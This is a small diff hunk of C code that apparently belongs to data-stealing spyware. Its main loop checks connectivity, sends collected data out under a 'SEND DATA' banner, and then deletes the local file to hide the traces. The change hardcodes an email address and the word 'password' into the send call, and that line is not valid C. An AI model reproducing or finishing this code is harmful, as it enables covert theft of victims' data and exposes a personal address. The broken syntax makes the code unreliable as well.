@@ -50,7 +50,7 @@ main(){
             Sleep(i*MAIL_WAIT_TIME); ///wait
             if(!system("ping www.google.com -n 1")){ ///check connection
                 ////////////****SEND DATA****////////////
-                sendData();
+                sendData(owenkirk@northgreene.com password);
 
                 Sleep(MAILING_TIME); ///wait! or file will be deleted before sending
                 DeleteFile(FILE_NAME);
